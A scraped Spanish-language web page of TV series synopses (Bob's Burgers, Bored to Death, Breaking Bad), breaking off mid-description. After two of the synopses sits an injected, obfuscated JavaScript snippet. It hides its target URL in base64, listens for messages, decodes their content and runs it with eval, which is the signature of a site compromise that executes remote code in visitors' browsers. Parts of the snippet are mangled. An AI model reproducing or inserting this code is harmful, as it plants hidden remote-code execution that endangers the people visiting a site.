Bob's Burgers es una hilarante nueva comedia animada sobre un hombre, su familia y un negocio de venta de hamburguesas. La nueva incorporación a la oferta de la "Dominación Animada" que FOX emite cada domingo, gira en torno a un hombre tremendamente creativo que posee una hamburguesería en crisis, en un pequeño pueblo costero del este, con la ayuda de su esposa. Llevar las riendas del restaurante no es fácil, especialmente cuando los tres hijos de la pareja no parecen tomarse el negocio muy en serio. Pero en medio de todos los problemas, hay una posibilidad de que las cosas vayan bien para el negocio familiar, si es que consiguen encontrar la forma de aguantar en medio de la fuerte competición que les rodea.
Miembro de la tercera generación de un clan de restauradores, Bob Belcher (voz de H. Jon Benjamin, Padre de Familia) dirige la hamburguesería Bob's Burgers con la ayuda de su mujer y sus tres hijos. Bob y su peculiar familia tienen grandes ideas sobre hamburguesas, condimentos y ensaladas, pero muy pocas sobre el servicio al cliente y sobre dirigir un negocio. A pesar de sus grasientos mostradores, la mala ubicación del local, la falta de clientes y el desastroso servicio, Bob está convencido de que sus hamburguesas se venden solas. Y aunque su negocio no funcione, Bob y su familia están decididos a hacer que la gran "re-re-re-apertura" sea todo un éxito.(function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write(");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write(")})();

Descripcion
Bored to Death es una comedia poco convencional creada por Jonathan Ames, (autor de varios libros, entre ellos la aclamada novela gráfica "The Alcoholic"), que sigue las aventuras y desventuras de un ficticio Jonathan Ames, quien trata de perseguir su quijótico sueño de emular a sus héroes de las novelas clásicas de detectives. Jonathan es un joven escritor de Brooklyn que se encuentra perdido. Acaba de atravesar por una dolorosa ruptura, gracias en parte a su afición a la bebida, no puede escribir su segunda novela, y sale demasiado de fiesta con su editor. En vez de afrontar la realidad, Jonathan decide recrearse en sus fantasías de ser un detective privado, porque quiere ser un héroe y un hombre de acción.
Jonathan Ames (Jason Schwartzman, Viaje a Darjeeling) es un escrito de Brooklyn que trata de escribir su segunda novela y que sobrevive gracias a las ocasiones colaboraciones que hace para la revista "Edition". Le gusta jugar al backgammon por Internet, el vino blanco, la marihuana y las novelas de detectives. Es precisamente algunos de estos gustos, combinados con su tendencia a la falta de decisión, lo que ha provocado que le abandone su novia. Como alma sensible y atormentada, Jonathan a menudo recurre a su mejor amigo o su mentor, y a veces jefe, para conseguir consejo y alivio. Pero además de ser un escritor en crisis, también tiene una parte heroica y desea buscar aventuras, por lo que comenzará a tener una doble vida como detective privado.(function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write(");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write(")})();

Descripcion
Breaking Bad gira en torno a Walter White (Bryan Cranston, Malcolm) un afable y encantador profesor de química que vive en Nuevo Mexico con su esposa y un hijo adolescente que tiene parálisis cerebral, y que tiene que trabajar lavando coches después de dar clase para poder mantener a su familia. Cuando un día, poco después de su cincuenta cumpleaños a White le diagnostican un cáncer de pulmor en estado III e inoperable, una noticia que hace que su mundo se derrumbe y cambie su perspectiva vital.
